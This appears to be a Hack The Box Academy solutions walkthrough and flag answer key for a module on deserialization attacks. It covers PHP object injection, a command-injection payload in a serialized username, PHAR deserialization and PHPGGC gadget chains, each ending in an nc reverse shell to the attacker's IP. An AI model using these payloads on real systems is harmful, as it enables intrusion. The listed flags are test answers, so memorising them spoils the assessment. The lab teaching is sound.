| Section                                  | Question Number | Answer                                  |
| ---------------------------------------- | --------------- | --------------------------------------- |
| Introduction to Serialization            | Question 1      | a:1:{s:6:"cereal";s:8:"cheerios";}      |
| Introduction to Serialization            | Question 2      | (dp0\\nVgangnam\\np1\\nVstyle\\np2\\ns. |
| Introduction to Deserialization Attacks  | Question 1      | Ruby                                    |
| Identifying a Vulnerability (PHP)        | Question 1      | 127                                     |
| Object Injection (PHP)                   | Question 1      | HTB{0f8f40a9cf61b847b4cdad489f3ff1ae}   |
| RCE: Magic Methods                       | Question 1      | HTB{4604f8d9c5574d3e0abdf7876ad4e933}   |
| RCE: Phar Deserialization                | Question 1      | htb-user                                |
| Tools of the Trade (PHP Deserialization) | Question 1      | 108                                     |
| Identifying a Vulnerability (Python)     | Question 1      | 37                                      |
| Object Injection (Python)                | Question 1      | HTB{203abaf6a820cc75da304c4884c3ab17}   |
| Remote Code Execution                    | Question 1      | HTB{09d1d96473483bf0c283fb11fdd3023e}   |
| Avoiding Deserialization Vulnerabilities | Question 1      | json\_encode                            |
| Skills Assessment I                      | Question 1      | HTB{e108090de0e4c1404a00ed1faf4fd2c5}   |
| Skills Assessment II                     | Question 1      | HTB{a9c1863ecc6775e6c5fd2597d47a1d29}   |
| Skills Assessment II                     | Question 2      | HTB{4f35303d9497d249a01f83dd7774fb39}   |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Introduction to Serialization

## Question 1

### "Using PHP, what is the serialized value of array("cereal" => "cheerios")?"

Students first need to launch an interactive PHP shell:

Code: shell

```shell
php -a
```

```shell
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-borea4f4yn]─[~]
└──╼ [★]$ php -a
Interactive mode enabled

php >
```

Subsequently, students need to use the `serialize` function on `array("cereal" => "cheerios")` to attain the bytes `a:1:{s:6:"cereal";s:8:"cheerios";}`:

Code: php

```php
echo serialize(array("cereal" => "cheerios"));
```

```shell
php > echo serialize(array("cereal" => "cheerios"));

a:1:{s:6:"cereal";s:8:"cheerios";}
```

Answer: `a:1:{s:6:"cereal";s:8:"cheerios";}`

# Introduction to Serialization

## Question 2

### "Using Python's Pickle library (Protocol version 0), what is the serialized value of {"gangnam":"style"}?"

Students first need to launch an interactive Python3 shell:

Code: shell

```shell
python3
```

```shell
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-rg6bn4h6fk]─[~]
└──╼ [★]$ python3

Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>
```

Subsequently, students need to import the `pickle` library, and use its `dumps` function on `{"gangnam":"style"}`, setting the optional argument `protocol` to 0 (the `decode` function decodes the resultant string using the codec registered for encoding strings, by default it is `UTF-8`):

Code: python

```python
import pickle
pickle.dumps({"gangnam":"style"}, protocol=0).decode()
```

Code: python

```python
>>> import pickle
>>> pickle.dumps({"gangnam":"style"}, protocol=0).decode()

'(dp0\nVgangnam\np1\nVstyle\np2\ns.'
```

Therefore, the serialized value is `(dp0\nVgangnam\np1\nVstyle\np2\ns.`.

Answer: `(dp0\nVgangnam\np1\nVstyle\np2\ns.`

# Introduction to Deserialization Attacks

## Question 1

### "What language was (likely) used to serialize the following data: BAhbD2kGaQdpCGkJaQppC2kMaQ1pDmkA?"

Students first need to base64 decode the string then create a hex dump of it using `xxd`:

Code: shell

```shell
echo 'BAhbD2kGaQdpCGkJaQppC2kMaQ1pDmkA' | base64 -d | xxd
```

```shell
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-rg6bn4h6fk]─[~]
└──╼ [★]$ echo 'BAhbD2kGaQdpCGkJaQppC2kMaQ1pDmkA' | base64 -d | xxd

00000000: 0408 5b0f 6906 6907 6908 6909 690a 690b  ..[.i.i.i.i.i.i.
00000010: 690c 690d 690e 6900                      i.i.i.i.
```

Students will notice that hex bytes start with `04 08`, therefore, the `Ruby` language was used for serialization.

Answer: `Ruby`

# Identifying a Vulnerability (PHP)

## Question 1

### "\[http://SERVER\_IP:8000\] Download the source code for HTBank and follow the steps to identify the vulnerability. What line number is unserialize called on in HTController.php?"

Students first need to download [htbank-src.zip](https://academy.hackthebox.com/storage/modules/169/htbank-src.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/169/htbank-src.zip && unzip htbank-src.zip
```

```shell
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-rg6bn4h6fk]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/169/htbank-src.zip && unzip htbank-src.zip

--2022-11-14 10:48:35--  https://academy.hackthebox.com/storage/modules/169/htbank-src.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12550668 (12M) [application/zip]
Saving to: ‘htbank-src.zip’

htbank-src.zip               100%[=============================================>]  11.97M  50.4MB/s    in 0.2s    

2022-11-14 10:48:35 (50.4 MB/s) - ‘htbank-src.zip’ saved [12550668/12550668]

Archive:  htbank-src.zip
   creating: htbank-clean/
   creating: htbank-clean/storage/
   <SNIP>
```

From the section's reading, students know that the file `HTController.php` is found within the `app/Http/Controllers/` directory:

![[HTB Solutions/CWEE/z. images/17b21c25a071d29a2fa6334af6639122_MD5.jpg]]

Therefore, students can use `grep` to search for the string `unserialize`, utilizing the `-n` (short version of `--line-number`) option to print the line number of the match, which is `127`:

Code: shell

```shell
grep -n "unserialize" htbank-clean/app/Http/Controllers/HTController.php
```

```shell
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-rg6bn4h6fk]─[~]
└──╼ [★]$ grep -n "unserialize" htbank-clean/app/Http/Controllers/HTController.php

127:                $userSettings = unserialize(base64_decode($request['settings']));
```

Answer: `127`

# Object Injection (PHP)

## Question 1

### "\[http://SERVER\_IP:8000\] Recreate the attack from this section to become admin and then submit the flag found on the dashboard"

Students first need to download [htbank-src.zip](https://academy.hackthebox.com/storage/modules/169/htbank-src.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/169/htbank-src.zip && unzip htbank-src.zip
```

```shell
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-rg6bn4h6fk]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/169/htbank-src.zip && unzip htbank-src.zip

--2022-11-14 10:48:35--  https://academy.hackthebox.com/storage/modules/169/htbank-src.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12550668 (12M) [application/zip]
Saving to: ‘htbank-src.zip’

htbank-src.zip               100%[=============================================>]  11.97M  50.4MB/s    in 0.2s    

2022-11-14 10:48:35 (50.4 MB/s) - ‘htbank-src.zip’ saved [12550668/12550668]

Archive:  htbank-src.zip
   creating: htbank-clean/
   creating: htbank-clean/storage/
   <SNIP>
```

Subsequently, inside the `htbank-clean` directory, students need to create a file called `UserSettings.php` and copy the contents of `app/Helpers/UserSettings.php` into it:

Code: shell

```shell
touch UserSettings.php
cat app/Helpers/UserSettings.php > UserSettings.php
```

```shell
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-czme8jwrxv]─[~/htbank-clean]
└──╼ [★]$ touch UserSettings.php
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-czme8jwrxv]─[~/htbank-clean]
└──╼ [★]$ cat app/Helpers/UserSettings.php > UserSettings.php 
```

Then, in the same directory, students need to create a file called `exploit.php` and make its contents to generate a serialized `UserSettings` object with the username `pentest`, the email address `admin@htbank.com`, the `Bcrypt` hash of the plaintext `password` (students can either use the same hash `$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda` that was utilized in the section or use [bcrypt-generator](https://bcrypt-generator.com/) to generate one), and the default image `default.jpg`:

Code: php

```php
<?php
include('UserSettings.php');

echo base64_encode(serialize(new \App\Helpers\UserSettings('pentest', 'admin@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg')));
```

Students can use `cat` to save the exploit code into `exploit.php`:

Code: shell

```shell
cat << 'EOF' > exploit.php
<?php
include('UserSettings.php');

echo base64_encode(serialize(new \App\Helpers\UserSettings('pentest', 'admin@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg')));
EOF
```

```shell
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-czme8jwrxv]─[~/htbank-clean]
└──╼ [★]$ cat << 'EOF' > exploit.php
> <?php
include('UserSettings.php');

echo base64_encode(serialize(new \App\Helpers\UserSettings('pentest', 'admin@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg')));
> EOF
```

Afterward, students can attain the serialized object by running `exploit.php`:

Code: shell

```shell
php exploit.php
```

```shell
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-czme8jwrxv]─[~/htbank-clean]
└──╼ [★]$ php exploit.php

TzoyNDoiQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzIjo0OntzOjMwOiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAE5hbWUiO3M6NzoicGVudGVzdCI7czozMToiAEFwcFxIZWxwZXJzXFVzZXJTZXR0aW5ncwBFbWFpbCI7czoxNjoiYWRtaW5AaHRiYW5rLmNvbSI7czozNDoiAEFwcFxIZWxwZXJzXFVzZXJTZXR0aW5ncwBQYXNzd29yZCI7czo2MDoiJDJ5JDEwJHU1bzZ1MkViak9tb2JRalZ0dTg3UU84WndRc0RkMnp6b3Fqd1MwLjV6dVByM2hxazl3ZmRhIjtzOjM2OiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAFByb2ZpbGVQaWMiO3M6MTE6ImRlZmF1bHQuanBnIjt9
```

(Students are highly encouraged to test the payload locally before remotely.) Then, students need to visit the web root page of the spawned target on port 8000 and create a dummy account:

![[HTB Solutions/CWEE/z. images/a20e958cc569c8a5e08d18be54fc2a40_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/371b4a9d93d909b519ca0f5a26cd484e_MD5.jpg]]

Once registered, students need to log in and then navigate to `/settings`:

![[HTB Solutions/CWEE/z. images/2aeb4f1f7e13e110b740fb3542fa71b7_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/a504e22e9f8f71edd9787d919cd12679_MD5.jpg]]

Then, students need to paste in the attained malicious serialized object into the "Settings" field and click on "Import Settings". Students will notice that the email address has been updated to `admin@htbank.com`:

![[HTB Solutions/CWEE/z. images/0e067e539b9bf7b4163906cda6b27c3f_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/fe0982c26f791c79607ad0913660e7fc_MD5.jpg]]

At last, students need to navigate to `/dashboard` by clicking on `HTBank` to find the flag `HTB{0f8f40a9cf61b847b4cdad489f3ff1ae}`:

![[HTB Solutions/CWEE/z. images/07c231ab653c9a31e2f54aaf8e6d9fc0_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/e0e3ca1b80a165f1f3f2873a1652c2d9_MD5.jpg]]

Answer: `HTB{0f8f40a9cf61b847b4cdad489f3ff1ae}`

# RCE: Magic Methods

## Question 1

### "\[http://SERVER\_IP:8000\] Following the attack in this section, obtain remote code execution and submit the contents of flag.txt"

From the section's reading, students know that the `__wakeup` magic method is overridden such that it uses `shell_exec` to append the `Name` property of `UserSettings.php` without any input sanitization, thus suffering from a command injection vulnerability:

Code: php

```php
public function __wakeup() {
        shell_exec('echo "$(date +\'[%d.%m.%Y %H:%M:%S]\') Imported settings for user \'' . $this->getName() . '\'" >> /tmp/htbank.log');
    }
```

Therefore, setting the name to start with `";` and end with `#`, students will be able to breakout of the `echo` command and run arbitrary ones.

Students need to download [htbank-src.zip](https://academy.hackthebox.com/storage/modules/169/htbank-src.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/169/htbank-src.zip && unzip htbank-src.zip
```

```shell
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-rg6bn4h6fk]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/169/htbank-src.zip && unzip htbank-src.zip

--2022-11-14 10:48:35--  https://academy.hackthebox.com/storage/modules/169/htbank-src.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12550668 (12M) [application/zip]
Saving to: ‘htbank-src.zip’

htbank-src.zip               100%[=============================================>]  11.97M  50.4MB/s    in 0.2s    

2022-11-14 10:48:35 (50.4 MB/s) - ‘htbank-src.zip’ saved [12550668/12550668]

Archive:  htbank-src.zip
   creating: htbank-clean/
   creating: htbank-clean/storage/
   <SNIP>
```

Subsequently, inside the `htbank-clean` directory, students need to create a file called `UserSettings.php` and copy the contents of `app/Helpers/UserSettings.php` into it:

Code: shell

```shell
touch UserSettings.php
cat app/Helpers/UserSettings.php > UserSettings.php
```

```shell
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-czme8jwrxv]─[~/htbank-clean]
└──╼ [★]$ touch UserSettings.php
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-czme8jwrxv]─[~/htbank-clean]
└──╼ [★]$ cat app/Helpers/UserSettings.php > UserSettings.php 
```

Then, in the same directory, students need to create a file called `exploit.php` and make its contents to generate a serialized `UserSettings` object with the username `"; nc -nv PWNIP PWNPO -e /bin/bash;#`, the email address `admin@htbank.com`, the `Bcrypt` hash of the plaintext `password` (students can either use the same hash `$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda` that was utilized in the section or use [bcrypt-generator](https://bcrypt-generator.com/) to generate one), and the default image `default.jpg`:

Code: php

```php
<?php
include('UserSettings.php');

echo base64_encode(serialize(new \App\Helpers\UserSettings('"; nc -nv PWNIP PWNPO -e /bin/bash;#', 'admin@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg')));
```

Students can use `cat` to save the exploit code into `exploit.php`:

Code: shell

```shell
cat << 'EOF' > exploit.php
<?php
include('UserSettings.php');

echo base64_encode(serialize(new \App\Helpers\UserSettings('"; nc -nv PWNIP PWNPO -e /bin/bash;#', 'admin@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg')));
EOF
```

```shell
┌─[us-academy-1]─[10.10.14.165]─[htb-ac413848@htb-pj87jtuskt]─[~/htbank-clean]
└──╼ [★]$ cat << 'EOF' > exploit.php
<?php
include('UserSettings.php');

echo base64_encode(serialize(new \App\Helpers\UserSettings('"; nc -nv 10.10.14.165 9999 -e /bin/bash;#', 'admin@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg')));
EOF
```

Afterward, students can attain the serialized object by running `exploit.php`:

Code: shell

```shell
php exploit.php
```

```shell
┌─[us-academy-1]─[10.10.14.165]─[htb-ac413848@htb-pj87jtuskt]─[~/htbank-clean]
└──╼ [★]$ php exploit.php

TzoyNDoiQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzIjo0OntzOjMwOiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAE5hbWUiO3M6NDI6IiI7IG5jIC1udiAxMC4xMC4xNC4xNjUgOTk5OSAtZSAvYmluL2Jhc2g7IyI7czozMToiAEFwcFxIZWxwZXJzXFVzZXJTZXR0aW5ncwBFbWFpbCI7czoxNjoiYWRtaW5AaHRiYW5rLmNvbSI7czozNDoiAEFwcFxIZWxwZXJzXFVzZXJTZXR0aW5ncwBQYXNzd29yZCI7czo2MDoiJDJ5JDEwJHU1bzZ1MkViak9tb2JRalZ0dTg3UU84WndRc0RkMnp6b3Fqd1MwLjV6dVByM2hxazl3ZmRhIjtzOjM2OiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAFByb2ZpbGVQaWMiO3M6MTE6ImRlZmF1bHQuanBnIjt9
```

(Students are highly encouraged to test the payload locally before remotely.) Then, students need to visit the web root page of the spawned target on port 8000 and create a dummy account:

![[HTB Solutions/CWEE/z. images/4300367deb818c6227978bd3314989be_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/f5452adb138f226a49e667f7dd41c9d7_MD5.jpg]]

Once registered, students need to log in and then navigate to `/settings`:

![[HTB Solutions/CWEE/z. images/83f55b9a4875571651482cbc97021866_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/4d38c6ca069c0a30848dd4ec57f08db2_MD5.jpg]]

Subsequently, students need to make sure that they have an `nc` listener on the port that was specified when creating the malicious serialized object (9999 in here):

Code: shell

```shell
nc -nvlp PWNPO
```

```shell
┌─[us-academy-1]─[10.10.14.165]─[htb-ac413848@htb-pj87jtuskt]─[~]
└──╼ [★]$ nc -nvlp 9999

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
```

Afterward, students need to paste in the attained malicious serialized object into the "Settings" field and then click on "Import Settings". Students will notice that the reverse shell connection has been established successfully in the `nc` listener:

![[HTB Solutions/CWEE/z. images/2a0963229250e41f347d0721a858904a_MD5.jpg]]

```shell
Ncat: Connection from 10.129.204.98.
Ncat: Connection from 10.129.204.98:60778.
whoami

htbank
```

At last, students need to print out the contents of the flag file "flag.txt" which is one directory up from the landing directory, attaining the flag `HTB{4604f8d9c5574d3e0abdf7876ad4e933}`:

Code: shell

```shell
cat ../flag.txt
```

```shell
cat ../flag.txt

HTB{4604f8d9c5574d3e0abdf7876ad4e933}
```

Answer: `HTB{4604f8d9c5574d3e0abdf7876ad4e933}`

# RCE: Phar Deserialization

## Question 1

### "\[http://SERVER\_IP:8000\] Using the PHAR deserialization attack vector, obtain RCE and submit the the name of the only folder in /home"

From the section's reading, students know that the web application allows arbitrary file upload in the settings page where they can upload a PHAR archive (with the jpg extension) and supply an arbitrary path and protocol to `file_exists` via the `/image` endpoint, therefore, they will be able to coerce the application into calling `file_exists` on a PHAR archive and thus deserializing whatever metadata is provided.

Students need to download [htbank-src.zip](https://academy.hackthebox.com/storage/modules/169/htbank-src.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/169/htbank-src.zip && unzip htbank-src.zip
```

```shell
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-rg6bn4h6fk]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/169/htbank-src.zip && unzip htbank-src.zip

--2022-11-14 10:48:35--  https://academy.hackthebox.com/storage/modules/169/htbank-src.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12550668 (12M) [application/zip]
Saving to: ‘htbank-src.zip’

htbank-src.zip               100%[=============================================>]  11.97M  50.4MB/s    in 0.2s    

2022-11-14 10:48:35 (50.4 MB/s) - ‘htbank-src.zip’ saved [12550668/12550668]

Archive:  htbank-src.zip
   creating: htbank-clean/
   creating: htbank-clean/storage/
   <SNIP>
```

Subsequently, inside the `htbank-clean` directory, students need to create a file called `UserSettings.php` and copy the contents of `app/Helpers/UserSettings.php` into it:

Code: shell

```shell
touch UserSettings.php
cat app/Helpers/UserSettings.php > UserSettings.php
```

```shell
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-czme8jwrxv]─[~/htbank-clean]
└──╼ [★]$ touch UserSettings.php
┌─[us-academy-1]─[10.10.14.126]─[htb-ac413848@htb-czme8jwrxv]─[~/htbank-clean]
└──╼ [★]$ cat app/Helpers/UserSettings.php > UserSettings.php 
```

Then, in the same directory, students need to create a file called `exploit.php` and make its contents to generate a PHAR archive named `exploit.phar`, and set its metadata to a `UserSettings` object with the username `"; nc -nv PWNIP PWNPO -e /bin/bash;#`, the email address `admin@htbank.com`, the `Bcrypt` hash of the plaintext `password` (students can either use the same hash `$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda` that was utilized in the section or use [bcrypt-generator](https://bcrypt-generator.com/) to generate one), and the default image `default.jpg`:

Code: php

```php
<?php
include('UserSettings.php');

$phar = new Phar("exploit.phar");

$phar->startBuffering();

$phar->addFromString('0', '');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new \App\Helpers\UserSettings('"; nc -nv PWNIP PWNPO -e /bin/sh ;#', 'admin@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg'));

$phar->stopBuffering();
```

Students can use `cat` to save the exploit code into `exploit.php`:

Code: shell

```shell
cat << 'EOF' > exploit.php
<?php
include('UserSettings.php');

$phar = new Phar("exploit.phar");

$phar->startBuffering();

$phar->addFromString('0', '');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new \App\Helpers\UserSettings('"; nc -nv PWNIP PWNPO -e /bin/sh ;#', 'admin@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg'));

$phar->stopBuffering();
EOF
```

```shell
┌─[eu-academy-1]─[10.10.14.2]─[htb-ac413848@htb-newkpi4obp]─[~/htbank-clean]
└──╼ [★]$ cat << 'EOF' > exploit.php
<?php
include('UserSettings.php');

$phar = new Phar("exploit.phar");

$phar->startBuffering();

$phar->addFromString('0', '');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new \App\Helpers\UserSettings('"; nc -nv 10.10.14.2 9999 -e /bin/sh ;#', 'admin@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg'));

$phar->stopBuffering();
EOF
```

Before running `exploit.php`, students need to modify `/etc/php/7.4/cli/php.ini` on Pwnbox/`PMVPN` so that `phar.readonly` is set to `Off` to prevent getting the error "PHP Fatal error: Uncaught UnexpectedValueException: creating archive "exploit.phar" disabled by the php.ini setting ...":

Code: php

```php
[Phar]
; http://php.net/phar.readonly
phar.readonly = Off
```

Afterward, students need to run `exploit.php` to attain the file `exploit.phar`:

Code: shell

```shell
php exploit.php
```

```shell
┌─[eu-academy-1]─[10.10.14.2]─[htb-ac413848@htb-newkpi4obp]─[~/htbank-clean]
└──╼ [★]$ php exploit.php 
┌─[eu-academy-1]─[10.10.14.2]─[htb-ac413848@htb-newkpi4obp]─[~/htbank-clean]
└──╼ [★]$ file exploit.phar 

exploit.phar: data
```

Then, students need to visit the web root page of the spawned target on port 8000 and create a dummy account:

![[HTB Solutions/CWEE/z. images/112445aa1bd8d7c307552601582fe4dd_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/6d7b7f86c83a13605e1afa0ac0b4e098_MD5.jpg]]

Once registered, students need to log in and then navigate to `/settings`:

![[HTB Solutions/CWEE/z. images/f4335fd23413ad284c6c8f0aecf2a502_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/7f69da84fbe82c8a2be7b32a01faf1e4_MD5.jpg]]

Then, students need to upload `exploit.phar` as the profile picture and then click on "Update":

![[HTB Solutions/CWEE/z. images/570ef3647fd0713193e0f5ba2be1ae9e_MD5.jpg]]

After updating the profile picture successfully, students need to copy its link:

![[HTB Solutions/CWEE/z. images/0ebe3cb4b2f96b401c3ec2a410e7e34a_MD5.jpg]]

Subsequently, students need to make sure that they have an `nc` listener on the port that was specified when creating the malicious PHAR (9999 in here):

Code: shell

```shell
nc -nvlp PWNPO
```

```shell
┌─[eu-academy-1]─[10.10.14.2]─[htb-ac413848@htb-newkpi4obp]─[~/htbank-clean]
└──╼ [★]$ nc -nvlp 9999

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
```

Thereafter, with the copied image link, students need to prepend the `phar://` wrapper to it, such as `http://STMIP:8000/image?_=phar://uploads/MD5Hash.jpg`, where `MD5Hash` is the value of the actual hash, then, students need to navigate to it so that the backend server will call `file_exists('phar://uploads/MD5Hash.jpg')` and the metadata will be deserialized. Students will notice that the reverse shell connection has been established in the `nc` listener successfully:

![[HTB Solutions/CWEE/z. images/79b3b1e7759c5df5210088ff268a3c07_MD5.jpg]]

```shell
Ncat: Connection from 10.129.204.98.
Ncat: Connection from 10.129.204.98:57724.
whoami

htbank
```

At last, when using `ls` on the directory `/home/`, students will find the directory `htb-user`:

Code: shell

```shell
ls /home/
```

```shell
ls /home/

htb-user
```

Answer: `htb-user`

# Tools of the Trade

## Question 1

### "\[http://SERVER\_IP:8000\] Using PHPGGC, obtain RCE on the target and submit the user-id of dnsmasq"

If `PHPGCC` is not installed, students first need to clone its [repository](https://github.com/ambionics/phpggc) and change directories into it:

Code: shell

```shell
git clone https://github.com/ambionics/phpggc.git && cd phpggc/
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tihlybxmyf]─[~]
└──╼ [★]$ git clone https://github.com/ambionics/phpggc.git && cd phpggc/

Cloning into 'phpggc'...
remote: Enumerating objects: 3150, done.
remote: Counting objects: 100% (696/696), done.
remote: Compressing objects: 100% (266/266), done.
remote: Total 3150 (delta 458), reused 554 (delta 400), pack-reused 2454
Receiving objects: 100% (3150/3150), 461.88 KiB | 7.00 MiB/s, done.
Resolving deltas: 100% (1330/1330), done.
```

Students then need to make the PHP script `phpggc` executable:

Code: shell

```shell
chmod +x phpggc
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tihlybxmyf]─[~/phpggc]
└──╼ [★]$ chmod +x phpggc
```

Before running `phpggc`, students need to modify `/etc/php/7.4/cli/php.ini` on Pwnbox/`PMVPN` so that `phar.readonly` is set to `Off` to prevent getting the error "ERROR: Cannot create phar: phar.readonly is set to 1.":

Code: php

```php
[Phar]
; http://php.net/phar.readonly
phar.readonly = Off
```

Subsequently, students need to utilize `phpggc` to generate a malicious PHAR file that calls the PHP function `system` with the argument `nc -nv PWNIP PWNPO -e /bin/bash`:

Code: shell

```shell
phpgcc -p phar Laravel/RCE9 system 'nc -nv PWNIP PWNPO -e /bin/bash' -o exploit.phar
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tihlybxmyf]─[~/phpggc]
└──╼ [★]$ ./phpggc -p phar Laravel/RCE9 system 'nc -nv 10.10.14.107 9001 -e /bin/bash' -o exploit.phar
```

Afterward, students need to visit the web root page of the spawned target on port 8000 and create a dummy account:

![[HTB Solutions/CWEE/z. images/5ea80e4ef9e79ac43b3cc99f8a7ac842_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/426051d1dc1814be1797ce9d91d997bc_MD5.jpg]]

Once registered, students need to log in and then navigate to `/settings`:

![[HTB Solutions/CWEE/z. images/ed407b3509f28399289c6b8166b84b5b_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/728d50df2a9541cc86cb8f705632c482_MD5.jpg]]

Then, on the "Settings" web page, students need to upload `exploit.phar` as the profile picture and then click on "Update":

![[HTB Solutions/CWEE/z. images/c0ef5334d1d136aa31081fad48a18a02_MD5.jpg]]

After updating the profile picture successfully, students need to copy its link:

![[HTB Solutions/CWEE/z. images/2297312da17e2aa353bf3be2f4c47067_MD5.jpg]]

Subsequently, students need to make sure that they have an `nc` listener on the port that was specified when creating the malicious PHAR file (9001 in here):

Code: shell

```shell
nc -nvlp PWNPO
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tihlybxmyf]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Thereafter, with the copied image link, students need to prepend the `phar://` wrapper to it, such as `http://STMIP:8000/image?_=phar://uploads/MD5Hash.jpg`, where `MD5Hash` is the value of the actual hash, then, students need to navigate to it so that the backend server will call `file_exists('phar://uploads/MD5Hash.jpg')` and the metadata will be deserialized. Students will notice that the reverse shell connection has been established in the `nc` listener successfully (students can ignore the error message "The address wasn't understood"):

![[HTB Solutions/CWEE/z. images/0616eb25ed286672110361710dd5ba48_MD5.jpg]]

```shell
Ncat: Connection from 10.129.204.98.
Ncat: Connection from 10.129.204.98:59882.
whoami

htbank
```

Then, students need to `grep` for `dnsmasq` in `/etc/passwd` to find out that the user-id of `dnsmasq` is `108`:

Code: shell

```shell
grep "dnsmasq" /etc/passwd
```

```shell
grep "dnsmasq" /etc/passwd

dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
```

